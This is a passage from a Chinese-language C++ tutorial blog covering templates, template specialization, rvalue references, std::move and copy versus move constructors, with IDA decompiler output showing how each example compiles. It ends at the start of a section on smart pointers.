*/</span></span><br><span class="line">    b.<span class="built_in">push_back</span>(<span class="number">3.0</span>);</span><br><span class="line">    b.<span class="built_in">push_back</span>(<span class="number">4.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>类模板实例化与函数模板实例化不同</li>
<li>类模板实例化需要在类模板名字后跟 <code>&lt;&gt;</code> 指定类型（函数模板实例化也可以用 <code>&lt;&gt;</code> 指定类型，即使没有，编译器也会自动识别类型）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mzt::vector&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>(&amp;a); <span class="comment">/* 类模板实例化 */</span></span><br><span class="line"><span class="built_in">LODWORD</span>(b._a) = <span class="number">1</span>;</span><br><span class="line">mzt::vector&lt;<span class="keyword">int</span>&gt;::<span class="built_in">push_back</span>(&amp;a, (<span class="keyword">const</span> <span class="keyword">int</span> *)&amp;b);</span><br><span class="line"><span class="built_in">LODWORD</span>(b._a) = <span class="number">2</span>;</span><br><span class="line">mzt::vector&lt;<span class="keyword">int</span>&gt;::<span class="built_in">push_back</span>(&amp;a, (<span class="keyword">const</span> <span class="keyword">int</span> *)&amp;b);</span><br><span class="line">mzt::vector&lt;<span class="keyword">double</span>&gt;::<span class="built_in">vector</span>(&amp;b); <span class="comment">/* 类模板实例化 */</span></span><br><span class="line">data = <span class="number">3.0</span>;</span><br><span class="line">mzt::vector&lt;<span class="keyword">double</span>&gt;::<span class="built_in">push_back</span>(&amp;b, &amp;data);</span><br><span class="line">data = <span class="number">4.0</span>;</span><br><span class="line">mzt::vector&lt;<span class="keyword">double</span>&gt;::<span class="built_in">push_back</span>(&amp;b, &amp;data);</span><br></pre></td></tr></table></figure>
<p><strong>模板特例化</strong></p>
<p>在原模板类的基础上，针对特殊类型所进行特殊化的实现方式</p>
<p>模板特化中分为：函数模板特化，类模板特化</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsEqual</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> left == right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;class T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsEqual</span><span class="params">(<span class="keyword">const</span> T&amp; left, <span class="keyword">const</span> T&amp; right)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> left == right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt; &gt; </span><br><span class="line"><span class="keyword">bool</span> IsEqual&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;(<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>&amp; left, </span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>&amp; right) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strcmp</span>(left, right) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* p1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* p2 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">bool</span> ret;</span><br><span class="line">    </span><br><span class="line">    ret = <span class="built_in">IsEqual</span>(a, b);</span><br><span class="line">	ret = IsEqual&lt;<span class="keyword">int</span>&gt;(a, b);</span><br><span class="line">	ret = IsEqual&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(p1, p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v4 = <span class="number">0</span>;</span><br><span class="line">v5 = <span class="number">1</span>;</span><br><span class="line">v6 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">v7[<span class="number">0</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="built_in">IsEqual</span>(<span class="number">0</span>, <span class="number">1</span>); <span class="comment">/* 调用普通函数(最优先) */</span></span><br><span class="line">IsEqual&lt;<span class="keyword">int</span>&gt;(&amp;v4, &amp;v5); <span class="comment">/* 调用模板函数 */</span></span><br><span class="line">IsEqual&lt;<span class="keyword">char</span> <span class="keyword">const</span>*&gt;(&amp;v6, v7); <span class="comment">/* 调用特例化的模板函数(次优先) */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果遇到相同普通函数（函数名和类型都相同），编译器则会优先调用普通函数（最优先）</li>
<li>如果指定类型匹配，特例化的模板函数会比普通的模板函数优先调用（次优先）</li>
</ul>
<p><strong>类型形参 &amp; 非类型形参</strong></p>
<p>模板参数分类：类型形参、非类型形参</p>
<ul>
<li>类型形参：出现在模板参数列表中，跟在 class 或者 typename 之后的参数类型名称</li>
<li>非类型形参：就是用一个常量作为类(函数)模板的一个参数，在类(函数)模板中可将该参数当成常量来使用 </li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mzt &#123;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span> =</span> <span class="keyword">int</span>, <span class="keyword">size_t</span> N = <span class="number">10</span>&gt; <span class="comment">/* T为类型形参,N为非类型形参 */</span></span><br><span class="line">	class Array &#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">    T&amp; <span class="keyword">operator</span>[](<span class="keyword">size_t</span> pos) &#123; <span class="comment">/* 重载[] */</span></span><br><span class="line">        <span class="keyword">return</span> arr[pos];</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		T arr[N];</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	mzt::Array&lt; &gt; a; <span class="comment">/* 不提供模板参数,使用缺省值 */</span></span><br><span class="line">    a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    a[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*mzt::Array&lt;<span class="keyword">int</span>,<span class="number">10ul</span>&gt;::<span class="keyword">operator</span>[](&amp;a, <span class="number">0LL</span>) = <span class="number">1</span>;</span><br><span class="line">*mzt::Array&lt;<span class="keyword">int</span>,<span class="number">10ul</span>&gt;::<span class="keyword">operator</span>[](&amp;a, <span class="number">1uLL</span>) = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<h2 id="右值引用"><a href="#右值引用" class="headerlink" title="右值引用"></a>右值引用</h2><p><strong>左值 &amp; 右值</strong></p>
<ul>
<li>左值是可以放在赋值号左边可以被赋值的值，左值必须要在内存中有实体<ul>
<li>当左值被赋值时，左值本身保留</li>
</ul>
</li>
<li>右值当在赋值号右边取出值赋给其他变量的值，右值可以在内存也可以在CPU寄存器<ul>
<li>当右值被赋值时，右值会被释放</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> &amp;b = a;		<span class="comment">/* 左值引用(b相当于a的别名) */</span></span><br><span class="line">    <span class="keyword">int</span> &amp;&amp;c = <span class="number">20</span>;	<span class="comment">/* 右值引用(c相当于20的别名) */</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; &amp;a &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &amp;b &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &amp;c &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; c &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffc2d216c30</span>:<span class="number">10</span></span><br><span class="line"><span class="number">0x7ffc2d216c30</span>:<span class="number">10</span></span><br><span class="line"><span class="number">0x7ffc2d216c34</span>:<span class="number">20</span></span><br></pre></td></tr></table></figure>
<p>IDA 分析：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v13 = <span class="number">10</span>; <span class="comment">/* int a = 10 */</span></span><br><span class="line">v15 = &amp;v13; <span class="comment">/* int &amp;b = a */</span></span><br><span class="line">v14 = <span class="number">20</span>; <span class="comment">/* int &amp;&amp;c = 20 */</span></span><br><span class="line">v16 = &amp;v14;</span><br><span class="line">v3 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, &amp;v13);</span><br><span class="line">v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v3, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">v5 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, v13);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v6 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, v15);</span><br><span class="line">v7 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v6, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">v8 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, *v15);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v9 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, v16);</span><br><span class="line">v10 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v9, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">v11 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, *v16);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v11, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br></pre></td></tr></table></figure>
<ul>
<li>在底层，右值引用相当于是赋值与左值引用的结合</li>
</ul>
<p><strong>std::move</strong></p>
<p><code>std::move</code> 唯一的功能是将一个左值强制转化为右值引用</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Ty</span>&gt;</span></span><br><span class="line"><span class="keyword">inline</span> _CONST_FUN <span class="keyword">typename</span> remove_reference&lt;_Ty&gt;::<span class="function">type&amp;&amp; <span class="title">move</span><span class="params">(_Ty&amp;&amp; _Arg)</span> _NOEXCEPT </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">typename</span> remove_reference&lt;_Ty&gt;::type&amp;&amp;&gt;(_Arg));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果是左值，就通过 <code>static_cast</code> 将传进来的参数强转为右值并返回</li>
<li>如果是右值，直接返回 </li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::string s = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    std::string sleft;</span><br><span class="line">    std::string sright;</span><br><span class="line"></span><br><span class="line">    sleft = s; <span class="comment">/* 左值赋值 */</span></span><br><span class="line">    std::cout &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">    std::cout &lt;&lt; sleft &lt;&lt; endl;</span><br><span class="line">    sright = std::<span class="built_in">move</span>(s); <span class="comment">/* 右值赋值 */</span></span><br><span class="line">    std::cout &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">    std::cout &lt;&lt; sright &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line"></span><br><span class="line">Hello</span><br></pre></td></tr></table></figure>
<ul>
<li>左值赋值：字符串 s 仍然存在</li>
<li>右值赋值：字符串 s 被置空</li>
</ul>
<p>IDA 分析：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v9, argv, envp);</span><br><span class="line">std::string::basic_string&lt;std::allocator&lt;<span class="keyword">char</span>&gt;&gt;(v10, <span class="string">&quot;Hello&quot;</span>, &amp;v9);</span><br><span class="line">std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v9);</span><br><span class="line">std::string::<span class="built_in">basic_string</span>(v11);</span><br><span class="line">std::string::<span class="built_in">basic_string</span>(v12);</span><br><span class="line">std::string::<span class="keyword">operator</span>=(v11, v10);</span><br><span class="line">v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;std::cout, v10);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;std::cout, v11);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v5 = std::move&lt;std::string &amp;&gt;(v10);</span><br><span class="line">std::string::<span class="keyword">operator</span>=(v12, v5);</span><br><span class="line">v6 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;std::cout, v10);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v7 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;std::cout, v12);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">std::string::~<span class="built_in">string</span>(v12);</span><br><span class="line">std::string::~<span class="built_in">string</span>(v11);</span><br><span class="line">std::string::~<span class="built_in">string</span>(v10)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>std::move</code> 在底层会直接返回参数的原始值，真正置空字符串 s 的操作是 <code>std::string::operator=()</code> 函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall std::move&lt;std::string &amp;&gt;(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>仔细分析可以发现左值赋值和右值赋值调用的 <code>std::string::operator=()</code> 函数不一样</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000002509</span> E8 E2 FC FF FF                call    __ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSERKS4_ ; std::string::<span class="keyword">operator</span>=(std::string <span class="keyword">const</span>&amp;)</span><br><span class="line">.text:<span class="number">0000000000002509</span></span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000002577</span> E8 <span class="number">84</span> FD FF FF                call    __ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSEOS4_ ; std::string::<span class="keyword">operator</span>=(std::string&amp;&amp;)</span><br><span class="line">.text:<span class="number">0000000000002577</span></span><br></pre></td></tr></table></figure>
<p><strong>拷贝构造函数 &amp; 移动构造函数</strong></p>
<p>如果想用其它对象初始化一个同类的新对象，只能借助类中的拷贝构造函数</p>
<ul>
<li>其实现原理是为新对象复制一份和其它对象一模一样的数据</li>
<li>当类中拥有指针类型的成员变量时，拷贝构造函数中需要以深拷贝的方式复制该指针成员 </li>
</ul>
<p>移动构造函数使用右值引用形式的参数</p>
<ul>
<li>在此构造函数中，num 指针变量采用的是浅拷贝的复制方式</li>
<li>在函数内部置空了 d.num（为了避免 “同一块对空间被释放多次”）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">demo</span>():<span class="built_in">num</span>(<span class="keyword">new</span> <span class="built_in"><span class="keyword">int</span></span>(<span class="number">1</span>))&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;construct!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">demo</span>(<span class="keyword">const</span> demo &amp;d):<span class="built_in">num</span>(<span class="keyword">new</span> <span class="built_in"><span class="keyword">int</span></span>(*d.num))&#123; <span class="comment">/* 拷贝构造函数(深拷贝) */</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;copy construct!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">demo</span>(demo &amp;&amp;d):<span class="built_in">num</span>(d.num)&#123; <span class="comment">/* 移动构造函数 */</span></span><br><span class="line">        d.num = <span class="literal">NULL</span>;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;move construct!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">demo</span>()&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;class destruct!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> *num;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function">demo <span class="title">get_demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">demo</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    demo a = <span class="built_in">get_demo</span>();</span><br><span class="line">    demo b = a;</span><br><span class="line">    demo c = <span class="built_in">move</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>IDA 分析：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get_demo</span>((demo *)v5);</span><br><span class="line">demo::<span class="built_in">demo</span>((demo *)v6, (<span class="keyword">const</span> demo *)v5); <span class="comment">/* 拷贝构造 */</span></span><br><span class="line">v3 = std::move&lt;demo &amp;&gt;(v5);</span><br><span class="line">demo::<span class="built_in">demo</span>(v7, v3); <span class="comment">/* 移动构造 */</span></span><br><span class="line">demo::~<span class="built_in">demo</span>((demo *)v7);</span><br><span class="line">demo::~<span class="built_in">demo</span>((demo *)v6);</span><br><span class="line">demo::~<span class="built_in">demo</span>((demo *)v5);</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">demo::demo</span><span class="params">(demo *<span class="keyword">this</span>, <span class="keyword">const</span> demo *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (_DWORD *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">4uLL</span>);</span><br><span class="line">  *v2 = **(_DWORD **)a2;</span><br><span class="line">  *(_QWORD *)<span class="keyword">this</span> = v2;</span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;copy construct!&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">demo::demo</span><span class="params">(_QWORD *a1, _QWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *a1 = *a2;</span><br><span class="line">  *a2 = <span class="number">0LL</span>;</span><br><span class="line">  v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;move construct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="智能指针"><a href="#智能指针" class="headerlink" title="智能指针"></a>智能指针</h2><p>智能指针 (Smart Pointer) 是一种在 C++ 中用于管理动态分配的内存的类，它提供了一种灵活的方式来管理对象的生命周期，可以避免资源泄漏和内存错误</p>
<p><strong>auto_ptr</strong></p>
<p>当对象过期时，其析构函数将自动使用 delete 来释放内存：</p>
